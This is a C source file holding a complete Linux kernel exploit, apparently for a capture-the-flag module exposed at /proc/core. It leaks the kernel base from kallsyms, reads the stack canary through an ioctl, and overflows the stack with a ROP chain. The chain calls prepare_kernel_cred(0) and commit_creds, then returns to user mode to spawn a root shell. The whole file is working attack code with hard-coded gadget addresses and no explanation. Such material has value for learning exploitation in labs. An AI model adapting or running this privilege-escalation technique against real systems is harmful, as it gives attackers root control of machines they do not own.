#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <errno.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <sys/syscall.h>
#include <stdint.h>
#include <sys/prctl.h>

size_t user_cs, user_ss, user_rflags, user_sp;
int fd;
size_t kernel_off = 0x9cce0;
size_t commint_off = 0x9c8e0;
size_t vmlinux_base1 = 0xffffffff81000000;
size_t vmlinux_base_now = 0x0;
size_t commit_creds = 0;
size_t prepare_kernel_cred = 0;
size_t p_rdi_r = 0xffffffff81000b2f;
size_t p_rdx_r = 0xffffffff810a0f49;
size_t p_rcx_r = 0xffffffff81021e53;
size_t mov_rdi_rax_call_rdx = 0xffffffff8101aa6a;
size_t swapgs_popfq_ret = 0xffffffff81a012da;
size_t iretq = 0xffffffff81050ac2;

void save_status(){
   __asm__("mov user_cs,cs;"
           "mov user_ss,ss;"
           "mov user_sp,rsp;"
           "pushf;"            //push eflags
           "pop user_rflags;"
          );
}

void get_shell(){
   if(!getuid()){
      system("/bin/sh");
   }
   else{
      puts("[*]spawn shell error!");
   }
   exit(0);
}

void errprocess(char* buf){
    printf("Error: %s\n", buf);
    exit(-1);
}

void cread(char* buf){
    if(-1 == ioctl(fd, 0x6677889B, buf)){
        errprocess("cread");
    }
}

void ccopy(size_t num){
    if(-1 == ioctl(fd, 0x6677889A, num)){
        errprocess("ccopy");
    }
}

void setoff(size_t off){
    if(-1 == ioctl(fd, 0x6677889C, off)){
        errprocess("setoff");
    }
}

void getVmlinuxAddr(){
    FILE* fd2 = fopen("/tmp/kallsyms", "r");
    if(fd2 < 0){
        errprocess("open kallsysm");
    }

    char buf[0x30] = { 0 };
    while(fgets(buf, 0x30, fd2)){
        if(commit_creds && prepare_kernel_cred)
            return 0;
        if(strstr(buf, "commit_creds") && !commit_creds){
            char hex[20] = { 0 };
            strncpy(hex, buf, 16);
            sscanf(hex, "%llx", &commit_creds);
            printf("commit_creds addr: %p\n", commit_creds);

            vmlinux_base_now = commit_creds - commint_off;
            printf("vmlinux_base_now: %p\n", vmlinux_base_now);
        }

        if(strstr(buf, "prepare_kernel_cred") && !prepare_kernel_cred){
            char hex[20] = { 0 };
            strncpy(hex, buf, 16);
            sscanf(hex, "%llx", &prepare_kernel_cred);
            printf("prepare_kernel_cred: %llx\n", prepare_kernel_cred);

            vmlinux_base_now = prepare_kernel_cred - kernel_off;
            printf("vmlinux_base_now: %p\n", vmlinux_base_now);
        }
    }
    if(!commit_creds && !prepare_kernel_cred){
        errprocess("Not get addr");
    }
}

int main(){
    save_status();
    getVmlinuxAddr();

    fd = open("/proc/core", O_RDWR);
    if (fd < 0){
        errprocess("open file");
    }

    size_t off = 64;
    setoff(off);

    char buf[0x100]= {0};
    cread(buf);
    size_t canary = *(size_t*)buf;
    printf("canary: 0x%lx\n", canary);
    size_t offset = vmlinux_base_now - vmlinux_base1;

    size_t rop[0x1000] = { 0 };
    int i = 0;
    for(i=0; i < 10; i++)
        rop[i] = canary;
    //prepare_kernel_cred(0)
    rop[i++] = p_rdi_r+offset;
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;
    //commit_cred(rax)
    rop[i++] = p_rdx_r+offset;
    rop[i++] = p_rcx_r+offset;
    rop[i++] = mov_rdi_rax_call_rdx+offset;
    rop[i++] = commit_creds;

    rop[i++] = swapgs_popfq_ret + offset;
    rop[i++] = 0;

    rop[i++] = iretq + offset;

    rop[i++] = (size_t)get_shell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;
    printf("write ok\n");
    //write rop into name
    write(fd, rop, 0x800);
    ccopy(0xffffffffffff0000 | (0x100));
    return 0;
}